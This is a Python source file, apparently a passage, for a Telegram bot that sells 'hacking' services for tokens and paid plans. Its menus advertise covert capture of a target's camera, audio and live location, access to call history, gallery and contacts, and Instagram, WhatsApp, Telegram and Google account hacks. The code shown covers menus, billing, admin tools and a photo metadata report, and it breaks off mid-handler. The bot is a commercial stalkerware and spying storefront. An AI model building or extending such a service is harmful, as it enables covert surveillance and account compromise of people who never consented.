import io
import html
import json
import os
import random
import string
import threading
import time
import uuid
import base64
from decimal import Decimal, ROUND_HALF_UP
from urllib.parse import urlencode, parse_qs, urlparse
from datetime import datetime, timedelta
import requests
from flask import Flask, request, render_template, jsonify, render_template_string
from PIL import Image, ImageDraw
import qrcode
import telebot
from telebot import types

# ----------------- 1. CONFIG -----------------
with open("config.json", "r") as f:
    config = json.load(f)

BOT_TOKEN      = config.get("bot_token")
ADMIN_ID       = int(config.get("admin_id"))
OWNER_USERNAME = config.get("owner_username")
SERVER_URL     = config.get("server_url")
CHANNELS       = config.get("channels", [])
GROUP          = config.get("group", {})
UPI_ID         = config.get("upi_id", "ayush@upi") # Added missing UPI_ID

DEV_TAG = f"👨‍💻 Developer: @{OWNER_USERNAME}\n👑 Credit: @GOD_AYUSH"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Flask(__name__)

# ----------------- 2. DM-ONLY WRAPPER -----------------
_orig = bot.message_handler

def _dm_only(*args, **kwargs):
    def deco(func):
        def wrapped(msg, *a, **kw):
            if msg.chat.type != "private":
                return
            if int(msg.from_user.id) != ADMIN_ID:
                db = load_db()
                user_data = db.get("users", {}).get(str(msg.from_user.id), {})
                if db.get("settings", {}).get("maintenance", False):
                    bot.send_message(msg.chat.id,
                        f"<blockquote>🔧 <b>Bot maintenance mein hai.</b>\nPlease thodi der baad try karein.\n{DEV_TAG}</blockquote>")
                    return
                if user_data.get("banned"):
                    bot.send_message(msg.chat.id,
                        f"<blockquote>🚫 Aapka access disabled hai.\nContact: @{OWNER_USERNAME}</blockquote>")
                    return
            return func(msg, *a, **kw)
        return _orig(*args, **kwargs)(wrapped)
    return deco

bot.message_handler = _dm_only

# ----------------- 3. BUTTONS -----------------
def kbtn(text, style=None):
    try:
        if style:
            return types.KeyboardButton(text, style=style)
        return types.KeyboardButton(text)
    except TypeError:
        b = types.KeyboardButton(text)
        if style:
            setattr(b, "style", style)
        return b

# ---------- PREMIUM (TOP) ----------
BTN_PREMIUM      = "🔥 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐇𝐚𝐜𝐤𝐢𝐧𝐠 🔥"

# ---------- MAIN MENU ----------
BTN_CAMERA     = "〖 ಠ〗𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_AUDIO      = "♫︎  𝐀𝐮𝐝𝐢𝐨"
BTN_LOCATION   = "༆ 𝐋𝐨𝐜𝐚𝐭𝐢𝐨n"
BTN_LIVE_LOC   = "📍 𝐋𝐢𝐯𝐞 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧"
BTN_NUM_INFO   = "🔍 𝐍𝐮𝐦𝐛𝐞𝐫 𝐈𝐧𝐟𝐨"
BTN_FAMILY_INFO= "👨‍👩‍👧‍👦 𝐅𝐚𝐦𝐢𝐥𝐲 𝐈𝐧𝐟𝐨"
BTN_CALL_HIST  = "📂 𝐂𝐚𝐥𝐥 𝐇𝐢𝐬𝐭𝐨𝐫𝐲 𝐀𝐮𝐝𝐢𝐭"
BTN_GALLERY    = "🖼 𝐆𝐚𝐥𝐥𝐞𝐫𝐲 𝐀𝐜𝐜𝐞𝐬𝐬"
BTN_CONTACTS   = "📇 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐀𝐜𝐜𝐞𝐬𝐬"
BTN_PHONE_HACK = "📡 𝐏𝐡𝐨𝐧𝐞 𝐇𝐚𝐜𝐤 & 𝐍𝐞𝐭"
BTN_PHOTO_INFO = "📸 𝐏𝐡𝐨𝐭𝐨 𝐓𝐨 𝐈𝐧𝐟𝐨"
BTN_INSTA_HACK = "📸 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 𝐇𝐚𝐜𝐤"
BTN_WA_HACK    = "💬 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐇𝐚𝐜𝐤"
BTN_TG_HACK    = "✈️ 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐇𝐚𝐜𝐤"
BTN_GOOGLE_HACK= "🔍 𝐆𝐨𝐨𝐠𝐥𝐞 𝐇𝐚𝐜𝐤"
BTN_PRICE      = "𝐏𝐫𝐢𝐜𝐞 ?"
BTN_BUY        = "💳 DIRECT BUY"
BTN_REDEEM     = "✍︎ 𝐑𝐞𝐝𝐞𝐞𝐦 𝐂𝐨𝐝𝐞"
BTN_BALANCE    = "✔︎ 𝐌𝐲 𝐁𝐚𝐥𝐚𝐧𝐜𝐞"
BTN_PAGE       = "𖠌 𝐏𝐞𝐠𝐞"
BTN_ADMIN      = "♕︎ 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐧𝐞𝐥"

# ---------- CAMERA SUB ----------
BTN_FRONT_CAM  = "〖 ಠ〗𝐅𝐫𝐨𝐧𝐭 𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_BACK_CAM   = "〖 ಠ〗𝐁𝐚𝐜𝐤 𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_FRONT_VID  = "〖 ಠ〗𝐅𝐫𝐨𝐧𝐭 8𝐬 𝐕𝐢𝐝𝐞𝐨"
BTN_BACK_VID   = "〖 ಠ〗𝐁𝐚𝐜𝐤 8𝐬 𝐕𝐢𝐝𝐞𝐨"
BTN_BACK_HOME  = "⌫  𝐁𝐚𝐜𝐤 𝐓𝐨 𝐇𝐨𝐦𝐞"

# ---------- PREMIUM SUB BUTTONS ----------
BTN_PREM_CAMERA     = "💎 𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_PREM_AUDIO      = "💎 𝐀𝐮𝐝𝐢𝐨"
BTN_PREM_LOCATION   = "💎 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧"
BTN_PREM_LIVE_LOC   = "💎 𝐋𝐢𝐯𝐞 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧"

BTN_PREM_CAM_FRONT      = "💎 𝐅𝐫𝐨𝐧𝐭 𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_PREM_CAM_BACK       = "💎 𝐁𝐚𝐜𝐤 𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_PREM_CAM_FRONT_VID  = "💎 𝐅𝐫𝐨𝐧𝐭 8𝐬 𝐕𝐢𝐝𝐞𝐨"
BTN_PREM_CAM_BACK_VID   = "💎 𝐁𝐚𝐜𝐤 8𝐬 𝐕𝐢𝐝𝐞𝐨"
BTN_PREM_BACK           = "⌫  𝐁𝐚𝐜𝐤 𝐓𝐨 𝐇𝐨𝐦𝐞"

# ---------- USER EXTRA ----------
BTN_HISTORY    = "📜 𝐌𝐲 𝐇𝐢𝐬𝐭𝐨𝐫𝐲"
BTN_REFER      = "🔗 𝐑𝐞𝐟𝐞𝐫 & 𝐄𝐚𝐫𝐧"
BTN_PROFILE    = "👤 𝐌𝐲 𝐏𝐫𝐨𝐟𝐢𝐥𝐞"
BTN_LEADER     = "🏆 𝐋𝐞𝐚𝐝𝐞𝐫𝐛𝐨𝐚𝐫𝐝"
BTN_HELP       = "🆘 𝐇𝐞𝐥𝐩"
BTN_TERMS      = "📄 𝐓𝐞𝐫𝐦𝐬"
BTN_FAQ        = "❓ 𝐅𝐀𝐐"
BTN_FEEDBACK   = "💬 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤"

# ---------- ADMIN ----------
BTN_GEN_REDEEM     = "✍︎ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐑𝐞𝐝𝐞𝐞𝐦"
BTN_USER_ACTIVITY  = "㋛︎ 𝐔𝐬𝐞𝐫 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐲"
BTN_USER_PLAN      = "シ︎ 𝐔𝐬𝐞𝐫 𝐏𝐥𝐚𝐧"
BTN_ACTIVATE_PLAN  = "✈︎ 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞 𝐏𝐥𝐚𝐧"
BTN_ADD_ALL        = "➕ 𝐀𝐝𝐝 𝐀𝐥𝐥 𝐂𝐫𝐞𝐝𝐢𝐭"
BTN_DEDUCT_ALL     = "➖ 𝐃𝐞𝐝𝐮𝐜𝐭 𝐀𝐥𝐥 𝐂𝐫𝐞𝐝𝐢𝐭"
BTN_ADD_ONE        = "👤 𝐀𝐝𝐝 𝟏 𝐔𝐬𝐞𝐫 𝐂𝐫𝐞𝐝𝐢𝐭"
BTN_DEDUCT_ONE     = "🗑 𝐃𝐞𝐝𝐮𝐜𝐭 𝟏 𝐔𝐬𝐞𝐫 𝐂𝐫𝐞𝐝𝐢𝐭"
BTN_CHECK_USER     = "🔍 𝐂𝐡𝐞𝐜𝐤 𝐔𝐬𝐞𝐫"
BTN_RESET_USER     = "♻️ 𝐑𝐞𝐬𝐞𝐭 𝐔𝐬𝐞𝐫"
BTN_CODES_LIST     = "🎟 𝐀𝐥𝐥 𝐑𝐞𝐝𝐞𝐞𝐦 𝐂𝐨𝐝𝐞𝐬"
BTN_REVOKE_CODE    = "🗑 𝐑𝐞𝐯𝐨𝐤𝐞 𝐂𝐨𝐝𝐞"
BTN_STATS          = "📊 𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐬"
BTN_BROADCAST      = "📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭"
BTN_BAN            = "🚫 𝐁𝐚𝐧 𝐔𝐬𝐞𝐫"
BTN_UNBAN          = "✅ 𝐔𝐧𝐛𝐚𝐧 𝐔𝐬𝐞𝐫"
BTN_SET_REF        = "⚙️ 𝐒𝐞𝐭 𝐑𝐞𝐟𝐞𝐫𝐫𝐚𝐥"
BTN_SET_DISCOUNT   = "🏷 𝐒𝐞𝐭 𝐃𝐢𝐬𝐜𝐨𝐮𝐧𝐭 %%"
BTN_SET_TOKENS_CMD = "🪙 𝐒𝐞𝐭 𝐂𝐦𝐝 𝐓𝐨𝐤𝐞𝐧𝐬"
BTN_MAINTENANCE    = "🔧 𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞"
BTN_EXPORT_DB      = "📤 𝐄𝐱𝐩𝐨𝐫𝐭 𝐃𝐁"
BTN_MANAGE_PLANS   = "🛍 Manage Plans"
BTN_TOGGLE_BTNS    = "🎛 Pvt. / Pub. Buttons"
BTN_BOT_AD         = "📢 Bot Advertisement"
BTN_BACK_ADMIN     = "⌫ 𝐁𝐚𝐜𝐤 𝐓𝐨 𝐀𝐝𝐦𝐢𝐧"

# ----------------- DATABASE -----------------
def load_db():
    try:
        with open("database.json", "r") as f:
            db = json.load(f)
    except Exception:
        db = {}
    db.setdefault("users", {})
    db.setdefault("redeem_codes", {})
    db.setdefault("settings", {})
    s = db["settings"]
    s.setdefault("maintenance", False)
    s.setdefault("referral_credits", 1)
    s.setdefault("discount_rate", 0)
    s.setdefault("premium_price", 1000)
    s.setdefault("premium_days", 30)
    s.setdefault("command_tokens", {})
    ct = s["command_tokens"]
    for k, v in {"camera": 20, "audio": 20, "location": 20, "live_location": 100,
                 "num_info": 10, "family_info": 10, "call_history": 300,
                 "gallery": 500, "contacts": 250, "phone_hack": 1000,
                 "photo_info": 800, "insta_hack": 100, "wa_hack": 100,
                 "tg_hack": 100, "google_hack": 100}.items():
        ct.setdefault(k, v)
    s.setdefault("feature_public", {})
    fp = s["feature_public"]
    for k in ["camera","audio","location","live_location","num_info","family_info",
              "call_history","gallery","contacts","phone_hack","photo_info",
              "insta_hack","wa_hack","tg_hack","google_hack","premium"]:
        fp.setdefault(k, True)
    s.setdefault("ad_bot", None)
    s.setdefault("custom_buttons", [])
    db.setdefault("plans", {
        "tok5":  {"name": "5 Tokens", "kind": "tokens", "value": 5, "price": "30.00", "active": True},
        "tok10": {"name": "10 Tokens", "kind": "tokens", "value": 10, "price": "40.00", "active": True},
        "tok30": {"name": "30 Tokens", "kind": "tokens", "value": 30, "price": "70.00", "active": True},
        "tok100":{"name": "100 Tokens", "kind": "tokens", "value": 100, "price": "220.00", "active": True},
        "vip3":  {"name": "VIP 3 Days", "kind": "vip", "value": 3, "price": "200.00", "active": True},
        "vip7":  {"name": "VIP 7 Days", "kind": "vip", "value": 7, "price": "350.00", "active": True},
        "vip30": {"name": "VIP 30 Days", "kind": "vip", "value": 30, "price": "1199.00", "active": True},
        "prem":  {"name": "Premium Hacking", "kind": "premium", "value": 30, "price": "1000.00", "active": True}
    })
    db.setdefault("pending_orders", {})
    db.setdefault("feedback_map", {})
    return db

def save_db(db):
    with open("database.json", "w") as f:
        json.dump(db, f, indent=4)

def _add_history(user, action, amount):
    user.setdefault("history", []).append({
        "action": action, "amount": amount,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    user["history"] = user["history"][-50:]

def get_user_data(user):
    db = load_db()
    uid = str(user.id)
    is_new = False
    if uid not in db["users"]:
        is_new = True
        init_tokens = 100000 if int(user.id) == ADMIN_ID else 0
        db["users"][uid] = {
            "tokens": init_tokens, "premium_expiry": None,
            "plan": "free", "expiry": None,
            "username": f"@{user.username}" if user.username else "N/A",
            "name": user.first_name, "history": [],
            "referred_by": None, "referrals": [],
            "banned": False,
            "joined": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_db(db)
    u = db["users"][uid]
    u.setdefault("history", [])
    u.setdefault("referrals", [])
    u.setdefault("banned", False)
    u.setdefault("referred_by", None)
    u.setdefault("joined", "N/A")
    u.setdefault("premium_expiry", None)
    return u, is_new

def has_active_plan(uid):
    if int(uid) == ADMIN_ID: return True
    db = load_db()
    u = db["users"].get(str(uid))
    if not u or u.get("banned"): return False
    if u.get("plan") == "unlimited":
        if u.get("expiry") is None: return True
        try:
            if datetime.now() < datetime.strptime(u["expiry"], "%Y-%m-%d %H:%M:%S"): return True
        except Exception: pass
    return u.get("tokens", 0) > 0

def has_premium_plan(uid):
    if int(uid) == ADMIN_ID: return True
    db = load_db()
    u = db["users"].get(str(uid))
    if not u: return False
    pe = u.get("premium_expiry")
    if pe:
        try:
            if datetime.now() < datetime.strptime(pe, "%Y-%m-%d %H:%M:%S"): return True
        except Exception: pass
    return False

def get_cmd_cost(cmd_key):
    db = load_db()
    return db["settings"].get("command_tokens", {}).get(cmd_key, 10)

def deduct_tokens_for_cmd(uid, cmd_key):
    if int(uid) == ADMIN_ID: return True
    db = load_db()
    u = db["users"].get(str(uid))
    if not u: return False
    if u.get("plan") == "unlimited":
        try:
            if not u.get("expiry") or datetime.now() < datetime.strptime(u["expiry"], "%Y-%m-%d %H:%M:%S"): return True
        except Exception: pass
    cost = get_cmd_cost(cmd_key)
    if u.get("tokens", 0) >= cost:
        u["tokens"] -= cost
        _add_history(u, f"used_{cmd_key}", -cost)
        save_db(db)
        return True
    return False

# ----------------- KEYBOARDS -----------------
def get_main_menu(user_id):
    db = load_db()
    pub = db.get("settings", {}).get("feature_public", {})
    custom_btns = db.get("settings", {}).get("custom_buttons", [])
    m = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    is_admin = int(user_id) == ADMIN_ID

    if is_admin or pub.get("premium", True):
        m.row(kbtn(BTN_PREMIUM, "danger"))

    if is_admin or pub.get("camera", True): m.add(kbtn(BTN_CAMERA, "primary"))
    if is_admin or pub.get("audio", True): m.add(kbtn(BTN_AUDIO, "primary"))
    if is_admin or pub.get("location", True): m.add(kbtn(BTN_LOCATION, "primary"))
    if is_admin or pub.get("live_location", True): m.add(kbtn(BTN_LIVE_LOC, "primary"))
    if is_admin or pub.get("num_info", True): m.add(kbtn(BTN_NUM_INFO, "success"))
    if is_admin or pub.get("family_info", True): m.add(kbtn(BTN_FAMILY_INFO, "success"))
    if is_admin or pub.get("call_history", True): m.add(kbtn(BTN_CALL_HIST, "primary"))
    if is_admin or pub.get("gallery", True): m.add(kbtn(BTN_GALLERY, "primary"))
    if is_admin or pub.get("contacts", True): m.add(kbtn(BTN_CONTACTS, "success"))
    if is_admin or pub.get("phone_hack", True): m.add(kbtn(BTN_PHONE_HACK, "danger"))
    if is_admin or pub.get("photo_info", True): m.add(kbtn(BTN_PHOTO_INFO, "success"))
    if is_admin or pub.get("insta_hack", True): m.add(kbtn(BTN_INSTA_HACK, "primary"))
    if is_admin or pub.get("wa_hack", True): m.add(kbtn(BTN_WA_HACK, "success"))
    if is_admin or pub.get("tg_hack", True): m.add(kbtn(BTN_TG_HACK, "primary"))
    if is_admin or pub.get("google_hack", True): m.add(kbtn(BTN_GOOGLE_HACK, "danger"))

    for cb in custom_btns: m.add(kbtn(cb, "primary"))

    m.add(kbtn(BTN_PRICE, "success"))
    m.add(kbtn(BTN_BUY, "success"), kbtn(BTN_REDEEM, "primary"))
    m.add(kbtn(BTN_BALANCE, "success"), kbtn(BTN_HISTORY, "primary"))
    m.add(kbtn(BTN_REFER, "primary"), kbtn(BTN_PROFILE, "primary"))
    m.add(kbtn(BTN_LEADER, "primary"), kbtn(BTN_HELP, "primary"))
    m.add(kbtn(BTN_TERMS, "primary"), kbtn(BTN_FAQ, "primary"))
    m.add(kbtn(BTN_FEEDBACK, "primary"))
    if is_admin: m.add(kbtn(BTN_ADMIN, "danger"))
    return m

def get_camera_menu():
    m = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    m.add(kbtn(BTN_FRONT_CAM, "primary"), kbtn(BTN_BACK_CAM, "primary"))
    m.add(kbtn(BTN_FRONT_VID, "primary"), kbtn(BTN_BACK_VID, "primary"))
    m.add(kbtn(BTN_BACK_HOME, "danger"))
    return m

def get_premium_menu(user_id):
    m = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    m.add(kbtn(BTN_PREM_CAMERA, "primary"), kbtn(BTN_PREM_AUDIO, "primary"))
    m.add(kbtn(BTN_PREM_LOCATION, "primary"), kbtn(BTN_PREM_LIVE_LOC, "primary"))
    m.add(kbtn(BTN_PREM_BACK, "danger"))
    return m

def get_premium_camera_menu():
    m = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    m.add(kbtn(BTN_PREM_CAM_FRONT, "primary"), kbtn(BTN_PREM_CAM_BACK, "primary"))
    m.add(kbtn(BTN_PREM_CAM_FRONT_VID, "primary"), kbtn(BTN_PREM_CAM_BACK_VID, "primary"))
    m.add(kbtn(BTN_PREM_BACK, "danger"))
    return m

def get_admin_menu():
    m = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    m.add(kbtn(BTN_GEN_REDEEM, "success"), kbtn(BTN_USER_ACTIVITY, "primary"))
    m.add(kbtn(BTN_USER_PLAN, "primary"), kbtn(BTN_ACTIVATE_PLAN, "primary"))
    m.add(kbtn(BTN_ADD_ALL, "success"), kbtn(BTN_DEDUCT_ALL, "danger"))
    m.add(kbtn(BTN_ADD_ONE, "success"), kbtn(BTN_DEDUCT_ONE, "danger"))
    m.add(kbtn(BTN_CHECK_USER, "primary"), kbtn(BTN_RESET_USER, "danger"))
    m.add(kbtn(BTN_CODES_LIST, "primary"), kbtn(BTN_REVOKE_CODE, "danger"))
    m.add(kbtn(BTN_STATS, "success"), kbtn(BTN_BROADCAST, "primary"))
    m.add(kbtn(BTN_BAN, "danger"), kbtn(BTN_UNBAN, "success"))
    m.add(kbtn(BTN_SET_REF, "primary"), kbtn(BTN_SET_DISCOUNT, "success"))
    m.add(kbtn(BTN_SET_TOKENS_CMD, "success"), kbtn(BTN_MAINTENANCE, "danger"))
    m.add(kbtn(BTN_EXPORT_DB, "primary"), kbtn(BTN_MANAGE_PLANS, "success"))
    m.add(kbtn(BTN_TOGGLE_BTNS, "primary"), kbtn(BTN_BOT_AD, "success"))
    m.add(kbtn("➕ Add Custom Button", "success"), kbtn("🗑 Remove Custom Button", "danger"))
    m.add(kbtn(BTN_BACK_HOME, "danger"))
    return m

def get_redeem_type_menu():
    m = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    m.add(kbtn("VIP", "success"), kbtn("Normal", "primary"))
    m.add(kbtn(BTN_BACK_ADMIN, "danger"))
    return m

# ----------------- START & BANNER -----------------
def make_circular_avatar(avatar_img, size=(130, 130), border_color="#2ECC71", border_width=5):
    avatar_img = avatar_img.resize(size, Image.Resampling.LANCZOS).convert("RGBA")
    mask = Image.new("L", size, 0)
    draw_mask = ImageDraw.Draw(mask)
    draw_mask.ellipse((0, 0, size[0], size[1]), fill=255)
    circular = Image.new("RGBA", size, (0, 0, 0, 0))
    circular.paste(avatar_img, (0, 0), mask=mask)
    draw_border = ImageDraw.Draw(circular)
    draw_border.ellipse((border_width // 2, border_width // 2, size[0] - border_width // 2, size[1] - border_width // 2), outline=border_color, width=border_width)
    return circular

def send_home_dashboard(chat_id, user):
    get_user_data(user)
    try: bot_name = bot.get_me().first_name
    except Exception: bot_name = "Dashboard"
    db = load_db()
    ad = db.get("settings", {}).get("ad_bot")
    text = (f"<blockquote>Welcome to {html.escape(bot_name)}\n"
            f"━━━━━━━━━━━━━━━━━━━━\nName : {html.escape(user.first_name or 'User')}\n"
            f"UID: {user.id}\nUsername: @{html.escape(user.username) if user.username else 'N/A'}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n{DEV_TAG}</blockquote>")
    if ad and ad.get("active"):
        text += f"\n<blockquote>📢 <b>Sponsored Bot:</b>\n👉 <a href='{ad.get('link')}'>{html.escape(str(ad.get('name', '')))}</a></blockquote>"
    markup = get_main_menu(user.id)
    try:
        user_photos = bot.get_user_profile_photos(user.id, limit=1)
        if os.path.exists("banner.png"):
            banner = Image.open("banner.png").convert("RGBA")
            if user_photos and user_photos.total_count > 0:
                fid = user_photos.photos[0][-1].file_id
                fi = bot.get_file(fid)
                downloaded = bot.download_file(fi.file_path)
                avatar = make_circular_avatar(Image.open(io.BytesIO(downloaded)))
                banner.paste(avatar, (30, 30), avatar)
            buf = io.BytesIO()
            banner.convert("RGB").save(buf, format="JPEG", quality=95)
            buf.seek(0)
            bot.send_photo(chat_id, photo=buf, caption=text, reply_markup=markup, parse_mode="HTML")
        else:
            bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")
    except Exception:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")

@bot.message_handler(commands=['start'])
def handle_start(message):
    if message.chat.type != "private": return
    user = message.from_user
    args = message.text.split()
    _, is_new = get_user_data(user)
    if is_new:
        try:
            bot.send_message(ADMIN_ID, f"🚨 <b>New User!</b>\n👤 {user.first_name}\n🆔 <code>{user.id}</code>\n🔗 @{user.username if user.username else 'N/A'}")
        except Exception: pass
    send_home_dashboard(message.chat.id, user)

@bot.message_handler(func=lambda m: m.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, BTN_PREM_BACK, "Back to home"])
def go_home(m): send_home_dashboard(m.chat.id, m.from_user)

def check_feature_access(message, feature_key):
    db = load_db()
    public_dict = db.get("settings", {}).get("feature_public", {})
    if not public_dict.get(feature_key, True) and int(message.from_user.id) != ADMIN_ID:
        bot.send_message(message.chat.id, f"<blockquote>🔧 <b>Feature under maintenance!</b>\n{DEV_TAG}</blockquote>")
        return False
    return True

# ----------------- BALANCE & PRICE -----------------
@bot.message_handler(func=lambda m: m.text == BTN_BALANCE)
def my_balance(message):
    uid = str(message.from_user.id)
    db = load_db()
    user = db["users"].get(uid)
    if int(uid) == ADMIN_ID:
        bot.reply_to(message, f"<blockquote>VIP Lifetime ✅\nToken: unlimited\n{DEV_TAG}</blockquote>"); return
    if not user or user.get("banned"):
        bot.reply_to(message, f"<blockquote>Not VIP ❌\nToken: 0\n{DEV_TAG}</blockquote>"); return
    
    prem_str = "✅ Active" if has_premium_plan(uid) else "❌ Not Active"
    
    if user.get("plan") == "unlimited" and user.get("expiry"):
        exp = datetime.strptime(user["expiry"], "%Y-%m-%d %H:%M:%S")
        if datetime.now() < exp:
            d = max(1, (exp - datetime.now()).days + 1)
            bot.reply_to(message, f"<blockquote>VIP {d}d ✅\nToken: unlimited\nPremium: {prem_str}\n{DEV_TAG}</blockquote>"); return
    bot.reply_to(message, f"<blockquote>Not VIP ❌\nToken: {user.get('tokens',0)}\nPremium: {prem_str}\n{DEV_TAG}</blockquote>")

def send_price_menu(chat_id):
    db = load_db()
    disc = db.get("settings", {}).get("discount_rate", 0)
    lines = ["🛍 <b>Plans</b>", "━━━━━━━━━━━━━━━━━━━━"]
    for pid, plan in db.get("plans", {}).items():
        if plan.get("active", True):
            unit = "tokens" if plan.get("kind") == "tokens" else "days VIP" if plan.get("kind") == "vip" else "days Premium"
            orig = Decimal(str(plan.get('price')))
            if disc > 0:
                final = orig * (Decimal("1") - Decimal(str(disc)) / Decimal("100"))
                lines.append(f"• {plan.get('name', pid)} — ₹{final.quantize(Decimal('0.01'), rounding=ROUND_HALF_UP)} ({disc}% OFF | {plan.get('value')} {unit})")
            else:
                lines.append(f"• {plan.get('name', pid)} — ₹{orig} ({plan.get('value')} {unit})")
    lines.append(f"━━━━━━━━━━━━━━━━━━━━\n{DEV_TAG}")
    mk = types.InlineKeyboardMarkup()
    mk.add(types.InlineKeyboardButton(f"💳 DIRECT BUY", callback_data="buy_open"))
    bot.send_message(chat_id, "<blockquote>" + "\n".join(lines) + "</blockquote>", reply_markup=mk)

@bot.message_handler(func=lambda m: m.text == BTN_PRICE)
def price_btn(m): send_price_menu(m.chat.id)

# ----------------- MAIN FEATURES (kept from original) -----------------
@bot.message_handler(func=lambda m: m.text == BTN_PHOTO_INFO)
def photo_info_start(message):
    if not check_feature_access(message, "photo_info"): return
    cost = get_cmd_cost("photo_info")
    if not has_active_plan(message.from_user.id):
        bot.send_message(message.chat.id, f"<blockquote>⚠️ No plan. Cost: {cost}\n{DEV_TAG}</blockquote>")
        send_price_menu(message.chat.id); return
    msg = bot.send_message(message.chat.id, f"<blockquote>📸 Photo info\nPhoto/document bhejein.\nCost: {cost}\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, process_photo_info_lookup)

def process_photo_info_lookup(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, BTN_PREM_BACK, "Back to home"]:
        send_home_dashboard(message.chat.id, message.from_user); return
    if not (message.photo or message.document):
        bot.send_message(message.chat.id, f"<blockquote>❌ Photo/document bhejein.\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id)); return
    uid = str(message.from_user.id)
    if not deduct_tokens_for_cmd(uid, "photo_info"):
        bot.send_message(message.chat.id, f"<blockquote>❌ Insufficient!\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id)); return
    bot.send_chat_action(message.chat.id, 'typing')
    try:
        file_id = message.document.file_id if message.document else message.photo[-1].file_id
        fi = bot.get_file(file_id)
        downloaded = bot.download_file(fi.file_path)
        temp_filename = f"temp_img_{uid}.jpg"
        with open(temp_filename, "wb") as f: f.write(downloaded)
        exif_info = {}
        try:
            img = Image.open(temp_filename)
            ed = img.getexif()
            if ed:
                for k, v in ed.items(): exif_info[str(k)] = str(v)
        except Exception: pass
        data = {
            "credit": "@GOD_AYUSH", "developer": "@" + OWNER_USERNAME,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "user_id": uid,
            "file_info": {"file_id": file_id, "file_path": fi.file_path, "has_document": bool(message.document)},
            "exif_metadata": exif_info if exif_info else {"status": "No EXIF data found"},
            "analysis_notes": "Full image attribute scan completed successfully."
        }
        json_bytes = json.dumps(data, indent=4, ensure_ascii=False).encode('utf-8')
        json_io = io.BytesIO(json_bytes); json_io.name = "Photo_Info_Report.json"
        pdf_io = io.BytesIO()
        try:
            from reportlab.lib.pagesizes import letter
            from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
            from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
            doc = SimpleDocTemplate(pdf_io, pagesize=letter, rightMargin=30, leftMargin=30, topMargin=30, bottomMargin=30)
            story = []
            styles = getSampleStyleSheet()
            title_style = ParagraphStyle('T', parent=styles['Heading1'], fontSize=16, textColor='#1e3a8a')
            body_style = ParagraphStyle('B', parent=styles['Normal'], fontSize=10, textColor='#334155')
            story.append(Paragraph("📸 Photo To Info Analysis Report", title_style))
            story.append(Paragraph(f"<b>Credit:</b> @GOD_AYUSH | <b>Developer:</b> @{OWNER_USERNAME}", body_style))
            story.append(Spacer(1, 10))
            story.append(Paragraph(f"<b>Timestamp:</b> {data['timestamp']}", body_style))
            story.append(Paragraph(f"<b>User ID:</b> {uid}", body_style))
            story.append(Spacer(1, 15))
            story.append(Paragraph("<b>EXIF Metadata & Attributes:</b>", styles['Heading2']))
            story.append(Paragraph(json.dumps(exif_info, indent=2), body_style))
            doc.build(story)
            pdf_io.seek(0); pdf_io.name = "Photo_Info_Report.pdf"
        except Exception:
            pdf_io = io.BytesIO(json_bytes); pdf_io.name = "Photo_Info_Report.pdf"
        bot.send_document(message.chat.id, document=json_io, caption=f"📊 <b>Full JSON Data Report</b>\n👨‍💻 Developer: @{OWNER_USERNAME}\n👑 Credit: @GOD_AYUSH", parse_mode="HTML")
        bot.send_document(message.chat.id, document=pdf_io, caption=f"📄 <b>Full PDF Data Report</b>\n👨‍💻 Developer: @{OWNER_USERNAME}\n👑 Credit: @GOD_AYUSH", parse_mode="HTML")
        if os.path.exists(temp_filename): os.remove(temp_filename)
    except Exception as e:
        bot.send_message(message.chat.id, f"<blockquote>❌ Error: {e}\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id))

@bot.message_handler(func=lambda m: m.text == BTN_NUM_INFO)
def num_info_start(message):
    if not check_feature_access(message, "num_info"): return
    cost = get_cmd_cost("num_info")
    if not has_active_plan(message.from_user.id):
        bot.send_message(message.chat.id, f"<blockquote>⚠️ No plan. Cost: {cost}\n{DEV_TAG}</blockquote>")
        send_price_menu(message.chat.id); return
